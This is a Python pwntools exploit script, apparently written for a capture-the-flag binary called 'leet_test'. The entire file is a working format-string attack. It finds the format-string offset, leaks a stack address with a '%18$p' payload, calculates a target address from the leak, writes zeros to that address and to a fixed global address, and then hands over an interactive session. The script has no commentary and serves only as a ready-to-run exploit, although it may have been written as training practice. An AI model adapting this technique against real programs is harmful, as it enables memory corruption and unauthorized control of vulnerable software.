from pwn import * 
import os 
os.system('clear')

def start(argv=[],  *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2],  *a, **kw)
    elif args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript ='''
init-pwndbg
break * 0x00000000004013a7
continue
'''.format(**locals())

exe = './leet_test'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'DEBUG'

def payload(exp):
    sh.sendline(exp)
    sh.recvuntil(b'Hello,')
    return sh.recvline().strip()

sh = start()
#pause()
format_str = FmtStr(execute_fmt=payload) # get fmtstr offset
log.success('Format strings offset : %d', format_str.offset)

sh.sendlineafter(b':', '%{}$p'.format(18))
sh.recvuntil(b'Hello,')
get = sh.recvline().strip()
#print(get)
get_addr = int(get, 16)
log.success('LEAKED STACK ADDRESS --> %#0x', get_addr)

# CALC THE RANDOM VALUE ADDRESS
calc = get_addr - 272 
log.success('CALCULATED --> %#0x', calc)

## perform writes
format_str.write(calc, 0) # set to 0
format_str.write(0x404078, 0) # set to 0 
format_str.execute_writes()

sh.interactive()
